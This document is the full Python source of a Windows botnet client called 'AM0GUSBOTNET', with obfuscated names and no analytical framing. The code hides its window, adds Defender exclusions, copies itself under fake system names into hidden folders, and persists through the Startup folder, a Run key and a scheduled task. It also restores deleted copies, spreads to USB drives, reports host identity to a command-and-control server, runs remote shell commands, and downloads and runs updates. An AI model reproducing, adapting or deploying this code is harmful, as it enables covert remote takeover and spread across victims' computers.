# ========== КОНФИГУРАЦИЯ AM0GUSBOTNET ==========
DEBUG = False
C2_SERVER = ""
C2_PORT = 4444
VERSION = "amogus000"
# ===============================================

import os as _os, sys as _sys, shutil as _sh, socket as _sk, subprocess as _sp, threading as _th, ctypes as _ct, time as _tm, json as _js, hashlib as _hl, winreg as _wr, random as _rd, string as _st
from pathlib import Path as _Pt

_CLIENT_ID = _hl.md5(f"{_os.environ['COMPUTERNAME']}{_os.environ['USERNAME']}".encode()).hexdigest()[:12]

_USER_PATHS = [
    _os.path.join(_os.environ["APPDATA"], "Microsoft", "Windows", "Themes", "System32"),
    _os.path.join(_os.environ["LOCALAPPDATA"], "Microsoft", "Windows", "Caches", "Updates"),
    _os.path.join(_os.environ["USERPROFILE"], "AppData", "LocalLow", "Microsoft", "CryptnetUrlCache", "Content"),
    _os.path.join(_os.environ["TEMP"], "Windows.Security", "Credentials"),
    _os.path.join(_os.environ["USERPROFILE"], "Contacts", "Microsoft"),
    _os.path.join(_os.environ["USERPROFILE"], "Saved Games", "Windows"),
    _os.path.join(_os.environ["APPDATA"], "Microsoft", "Windows", "Libraries", "Cache"),
]

_FAKE_NAMES = [
    "svchost.exe", "runtimebroker.exe", "dllhost.exe",
    "taskhostw.exe", "ctfmon.exe", "SecurityHealthSystray.exe"
]

def __0x1():
    try:
        _ct.windll.user32.ShowWindow(_ct.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def __0x2():
    _0x3 = _rd.choice(["Windows", "Microsoft", "Intel", "AMD", "Nvidia"])
    _0x4 = _rd.choice(["Update", "Service", "Helper", "Monitor", "Security"])
    _0x5 = ''.join(_rd.choices(_st.digits, k=5))
    return f"{_0x3}{_0x4}{_0x5}.exe"

class ___0x6:
    @staticmethod
    def __0x7(_0x8):
        try:
            _ct.windll.kernel32.SetFileAttributesW(_0x8, 6)
        except:
            pass
    
    @staticmethod
    def __0x9():
        try:
            _0xA = r"Software\Microsoft\Windows Defender\Exclusions\Paths"
            with _wr.CreateKey(_wr.HKEY_CURRENT_USER, _0xA) as _0xB:
                for _0xC in _USER_PATHS:
                    try:
                        _wr.SetValueEx(_0xB, _0xC, 0, _wr.REG_DWORD, 1)
                    except:
                        pass
        except:
            pass

class ___0xD:
    def __init__(self):
        self.__0xE = []
        self.__0xF = _sys.argv[0]
    
    def __0x10(self):
        for _0x11 in _USER_PATHS:
            try:
                _os.makedirs(_0x11, exist_ok=True)
                _0x12 = __0x2()
                _0x13 = _os.path.join(_0x11, _0x12)
                if not _os.path.exists(_0x13):
                    _sh.copy2(self.__0xF, _0x13)
                    ___0x6.__0x7(_0x13)
                    self.__0xE.append(_0x13)
            except Exception:
                continue
        return len(self.__0xE) > 0
    
    def __0x14(self):
        _0x15 = [self.__0x16, self.__0x17, self.__0x18]
        _0x19 = False
        for _0x1A in _0x15:
            try:
                if _0x1A():
                    _0x19 = True
            except:
                continue
        return _0x19
    
    def __0x16(self):
        try:
            _0x1B = _os.path.join(_os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            if _os.path.exists(_0x1B):
                _0x1C = __0x2()
                _0x1D = _os.path.join(_0x1B, _0x1C)
                _sh.copy2(self.__0xE[0], _0x1D)
                ___0x6.__0x7(_0x1D)
                return True
        except:
            pass
        return False
    
    def __0x17(self):
        try:
            _0x1E = _wr.HKEY_CURRENT_USER
            _0x1F = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with _wr.OpenKey(_0x1E, _0x1F, 0, _wr.KEY_WRITE) as _0x20:
                _0x21 = f"SystemUpdate_{_rd.randint(1000, 9999)}"
                _wr.SetValueEx(_0x20, _0x21, 0, _wr.REG_SZ, self.__0xE[0])
                return True
        except:
            pass
        return False
    
    def __0x18(self):
        try:
            _0x22 = f"WindowsMaintenance_{_rd.randint(1000, 9999)}"
            _0x23 = f'''<?xml version="1.0"?>
<Task version="1.2">
    <RegistrationInfo>
        <Description>Системное обслуживание Windows</Description>
    </RegistrationInfo>
    <Triggers>
        <LogonTrigger>
            <Enabled>true</Enabled>
        </LogonTrigger>
    </Triggers>
    <Actions>
        <Exec>
            <Command>{self.__0xE[0]}</Command>
        </Exec>
    </Actions>
</Task>'''
            _0x24 = _os.path.join(_os.environ["TEMP"], f"{_0x22}.xml")
            with open(_0x24, 'w') as _0x25:
                _0x25.write(_0x23)
            _sp.run(['schtasks', '/create', '/tn', _0x22, '/xml', _0x24, '/f'], capture_output=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            _os.remove(_0x24)
            return True
        except:
            pass
        return False
    
    def __0x26(self):
        def __0x27():
            while True:
                _tm.sleep(60)
                _0x28 = []
                for _0x29 in self.__0xE:
                    if not _os.path.exists(_0x29):
                        _0x28.append(_0x29)
                for _0x2A in _0x28:
                    try:
                        _0x2B = next(_0x2C for _0x2C in self.__0xE if _0x2C != _0x2A and _os.path.exists(_0x2C))
                        _sh.copy2(_0x2B, _0x2A)
                        ___0x6.__0x7(_0x2A)
                    except:
                        pass
        _0x2D = _th.Thread(target=__0x27)
        _0x2D.daemon = True
        _0x2D.start()

class ___0x2E:
    @staticmethod
    def __0x2F():
        import win32file as _wf
        import win32con as _wc
        import win32api as _wa
        
        _0x30 = set()
        while True:
            _tm.sleep(10)
            _0x31 = set()
            _0x32 = _wa.GetLogicalDriveStrings().split('\x00')[:-1]
            for _0x33 in _0x32:
                if _wa.GetDriveType(_0x33) == _wc.DRIVE_REMOVABLE:
                    _0x31.add(_0x33)
            _0x34 = _0x31 - _0x30
            for _0x35 in _0x34:
                ___0x2E.__0x36(_0x35)
            _0x30 = _0x31
    
    @staticmethod
    def __0x36(_0x37):
        try:
            _0x38 = None
            for _0x39 in _USER_PATHS:
                for _0x3A in _os.listdir(_0x39):
                    if _0x3A.endswith('.exe'):
                        _0x38 = _os.path.join(_0x39, _0x3A)
                        break
                if _0x38:
                    break
            if not _0x38:
                return
            _0x3B = _os.path.join(_0x37, "System Volume Information")
            if not _os.path.exists(_0x3B):
                _os.makedirs(_0x3B)
            _0x3C = _rd.choice(_FAKE_NAMES)
            _0x3D = _os.path.join(_0x3B, _0x3C)
            _sh.copy2(_0x38, _0x3D)
            ___0x6.__0x7(_0x3B)
            ___0x6.__0x7(_0x3D)
        except Exception:
            pass

class ___0x3E:
    def __init__(self):
        self.__0x3F = None
        self.__0x40 = True
    
    def __0x41(self):
        while self.__0x40:
            try:
                _0x42 = _sk.socket(_sk.AF_INET, _sk.SOCK_STREAM)
                _0x42.settimeout(30)
                _0x42.connect((C2_SERVER, C2_PORT))
                _0x43 = {
                    'id': _CLIENT_ID,
                    'host': _os.environ['COMPUTERNAME'],
                    'user': _os.environ['USERNAME'],
                    'arch': _os.environ['PROCESSOR_ARCHITECTURE'],
                    'version': VERSION
                }
                _0x42.send(_js.dumps(_0x43).encode())
                self.__0x3F = _0x42
                self.__0x44()
            except Exception:
                _tm.sleep(60)
    
    def __0x44(self):
        while self.__0x40 and self.__0x3F:
            try:
                _0x45 = self.__0x3F.recv(4096)
                if not _0x45:
                    break
                self.__0x46(_0x45)
            except _sk.timeout:
                continue
            except:
                break
        self.__0x3F = None
    
    def __0x46(self, _0x47):
        try:
            _0x48 = _js.loads(_0x47.decode())
            _0x49 = _0x48.get('type')
            if _0x49 == 'cmd':
                self.__0x4A(_0x48.get('command', ''))
            elif _0x49 == 'self_destruct':
                self.__0x4B()
            elif _0x49 == 'mass_destruct':
                self.__0x4B(mass=True)
            elif _0x49 == 'update':
                self.__0x4C(_0x48.get('url'))
        except Exception:
            pass
    
    def __0x4A(self, _0x4D):
        try:
            _0x4E = _sp.run(_0x4D, shell=True, capture_output=True, text=True, timeout=30, creationflags=_sp.CREATE_NO_WINDOW)
            _0x4F = {
                'type': 'cmd_result',
                'output': _0x4E.stdout + _0x4E.stderr,
                'returncode': _0x4E.returncode
            }
            if self.__0x3F:
                self.__0x3F.send(_js.dumps(_0x4F).encode())
        except Exception:
            pass
    
    def __0x4B(self, mass=False):
        try:
            try:
                _0x50 = _wr.HKEY_CURRENT_USER
                _0x51 = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with _wr.OpenKey(_0x50, _0x51, 0, _wr.KEY_ALL_ACCESS) as _0x52:
                    _0x53 = 0
                    while True:
                        try:
                            _0x54, _0x55, _ = _wr.EnumValue(_0x52, _0x53)
                            if 'SystemUpdate' in _0x54:
                                _wr.DeleteValue(_0x52, _0x54)
                            _0x53 += 1
                        except OSError:
                            break
            except:
                pass
            for _0x56 in _USER_PATHS:
                try:
                    for _0x57 in _os.listdir(_0x56):
                        if _0x57.endswith('.exe'):
                            _os.remove(_os.path.join(_0x56, _0x57))
                except:
                    pass
            _os._exit(0)
        except:
            _os._exit(0)
    
    def __0x4C(self, _0x58):
        try:
            import urllib.request as _ur
            _0x59 = _os.path.join(_os.environ["TEMP"], "update.exe")
            _ur.urlretrieve(_0x58, _0x59)
            _sp.Popen([_0x59])
            _os._exit(0)
        except:
            pass

def __0x5A():
    __0x1()
    _0x5B = ___0x6()
    _0x5C = ___0xD()
    _0x5D = ___0x3E()
    _0x5B.__0x9()
    if _0x5C.__0x10():
        _0x5C.__0x14()
        _0x5C.__0x26()
    try:
        import win32api as _wa
        import win32con as _wc
        _0x5E = _th.Thread(target=___0x2E.__0x2F)
        _0x5E.daemon = True
        _0x5E.start()
    except:
        pass
    _0x5F = _th.Thread(target=_0x5D.__0x41)
    _0x5F.daemon = True
    _0x5F.start()
    while True:
        _tm.sleep(3600)

if __name__ == "__main__":
    if len(_sys.argv) <= 1:
        __0x5A()
